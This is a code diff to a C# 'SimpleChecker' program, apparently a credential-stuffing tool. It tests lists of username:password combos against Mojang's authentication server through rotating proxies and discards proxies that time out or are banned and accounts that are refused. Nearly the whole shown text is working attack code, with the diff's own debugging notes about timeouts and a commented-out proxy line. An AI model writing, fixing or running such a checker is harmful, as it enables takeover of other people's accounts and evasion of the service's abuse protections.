@@ -1,3 +1,5 @@
+using System.Net.Mail;
+using System.Threading;
 using System.Collections.Generic;
 using System.Security.Cryptography;
 using System.Text;
@@ -12,44 +14,44 @@ namespace SimpleChecker
         protected List<string> proxyList = new List<string>();
         protected List<string> combos = new List<string>();
 
-        public Request(List<string> proxies)
+        public Request(List<string> proxies, List<string> combos)
         {
             this.proxyList = proxies;
+            this.combos = combos;
         }
         public string GrabProxie()
         {
             Random r = new Random();
             int index = r.Next(0,proxyList.Count - 1); //keep it in bounds
-            string myproxy = proxyList[index];
-            return myproxy;
+            return proxyList[index];
         }
 
         public void GrabUserandPassword()
         //extract a line from the combos.txt
         {
-            string line;
-            using(StreamReader sr = new StreamReader("combos.txt"))
             {
-                while((line = sr.ReadLine()) != null)
+                foreach (string line in combos)
                 {
                     string[] proxyandport = GrabProxie().Split(":");
                     string proxy = proxyandport[0];
                     string port = proxyandport[1];
-                    string[] combo = line.Split(":");
-                    Post(proxy, port,combo[0],combo[1]);
+                    string[] usrpws = line.Split(":");
+                    string name = usrpws[0];
+                    string pwd = usrpws[1];
+                    Post(proxy, port, name, pwd);
                 }
             }
         }
         public void Post(string proxy, string port, string name, string pwd)
         {
-            Console.ReadKey();
             try
             {
                 //open connection
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://authserver.mojang.com/authenticate");
                 request.Method = "POST";
-                request.Proxy = new WebProxy(proxy,int.Parse(port)); //connect through random proxy
-                request.Timeout = 50; //set proxy alive time
+                // request.Proxy = new WebProxy(proxy,int.Parse(port)); //connect through random proxy //!leadiung to timeout later on
+                request.Timeout = Timeout.Infinite; //set proxy alive time
+                request.KeepAlive =true;
 
 
                 //set payload
@@ -67,7 +69,7 @@ namespace SimpleChecker
                 requestStream.Close();
 
                 //read response
-                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                HttpWebResponse response = (HttpWebResponse)request.GetResponse(); //!operation times out //error
                 string result;
                 using (StreamReader rdr = new StreamReader(response.GetResponseStream()))
                 {
@@ -81,20 +83,19 @@ namespace SimpleChecker
                 }
 
             }
-            catch(Exception e)//if the remote server return an unauth response
+            catch(WebException e)//if the remote server return an unauth response
             {
-                Console.WriteLine(e);
                 Console.ForegroundColor  = ConsoleColor.Red; // bad proxie (blanket banned)
                 if (e.ToString().Contains("timed out"))
                 {
-                    Console.WriteLine(e);
                     Console.ReadKey();
                     Console.WriteLine("---[Proxy Timeout(5s)]---");
                     Console.WriteLine("   "+proxy+":"+port);
-                    int removal = proxyList.IndexOf(proxy);
+                    int removal = proxyList.IndexOf(proxy+":"+port);
                     proxyList.RemoveAt(removal);
                     Console.WriteLine("---[  Removed Proxy  ]---");
-                }else if(e.ToString().Contains("Forbidden")) // bad account
+                }
+                else if(e.ToString().Contains("Forbidden")) // bad account
                 {
                     int removal = combos.IndexOf(name+":"+pwd);
                     combos.RemoveAt(removal);
